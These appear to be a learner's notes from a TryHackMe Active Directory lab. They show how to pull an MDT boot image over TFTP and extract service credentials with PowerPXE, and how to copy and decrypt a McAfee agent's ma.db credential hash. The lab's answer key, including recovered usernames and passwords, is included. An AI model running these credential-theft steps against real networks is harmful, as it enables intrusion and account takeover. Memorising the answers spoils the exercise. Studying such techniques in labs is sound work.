## MDT Notes

.BCD file name
```
x64{9C1BB22D-B662-487F-9322-7526E92DD907}.bcd
```

Create a directory in documents 
Copy the PowerPXE.ps1 located at C:\ file into this directory
Use TFTP and download the .bcd file, we need to be accurate when specifying file and filepaths with TFTP.
The BCD files are always located at /Tmp/ directory on the MDT server
```
tftp -i <THMMDT IP> GET "\Tmp\x64{9C1BB22D-B662-487F-9322-7526E92DD907}.bcd" conf.bcd
```
With the BCD file now recovered, we will be using powerpxe to read its contents. 

```
powershell -executionpolicy bypass
	Import-Module .\PowerPXE.ps1
	$BCDFile = "conf.bcd"
	Get-WimFile -bcdFile $BCDFile
```
![[Pasted image 20230410190201.png]]

WIM files are bootable images in the Windows Imaging Format (WIM). Now that we have the location of the PXE Boot image, we can again use TFTP to download this image:
```
tftp -i <THMMDT IP> GET "<PXE Boot Image Location>" pxeboot.wim
```
![[Pasted image 20230410190333.png]]

Now that we have recovered the PXE Boot image, we can exfiltrate stored credentials. It should be noted that there are various attacks that we could stage. We could inject a local administrator user, so we have admin access as soon as the image boots, we could install the image to have a domain-joined machine.

Again we will use powerpxe to recover the credentials, but you could also do this step manually by extracting the image and looking for the bootstrap.ini file, where these types of credentials are often stored. To use powerpxe to recover the credentials from the bootstrap file, run the following command:
 ```
 Get-FindCredentials -WimFile pxeboot.wim
```
![[Pasted image 20230410190743.png]]

### Questions
**What Microsoft tool is used to create and host PXE Boot images in organisations?**
```
Microsoft Deployment Toolkit
```
**What network protocol is used for recovery of files from the MDT server?**
```
TFTP
```
**What is the username associated with the account that was stored in the PXE Boot image?**
```
svcMDT
```
**What is the password associated with the account that was stored in the PXE Boot image?**
```
PXEBootSecure1@
```

## Configurantion files

Suppose you were lucky enough to cause a breach that gave you access to a host on the organisation's network. ***In that case, configuration files are an excellent avenue to explore in an attempt to recover AD credentials***. Depending on the host that was breached, various configuration files may be of value for enumeration: 
````ad-note
***Configuration files are an excellent avenue to explore in an attempt to recover AD credentials***.
 
Several enumeration scripts, such as Seatbelt, can be used to automate this process.
````

McAfee embeds the credentials used during installation to connect back to the orchestrator in a file called ma.db.
The ma.db file is stored in a fixed location:
```
cd C:\ProgramData\McAfee\Agent\DB
```
![[Pasted image 20230410191340.png]]

Lets copy this file to our machine
```
scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
```

Open the database with sqlitebrowser and search for the Hash
```
jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
```

Use the python script provided in task files to decrypt this mcafee hash.

### Questions

***What type of files often contain stored credentials on hosts?***
```
Configuration files
```

**What is the name of the McAfee database that stores configuration including credentials used to connect to the orchestrator?**
```
ma.db
```

**What table in this database stores the credentials of the orchestrator?**
```
AGENT_REPOSITORIES
```

**What is the username of the AD account associated with the McAfee service?**
```
svcav
```

**What is the password of the AD account associated with the McAfee service?**
```
MyStrongPassword!
```
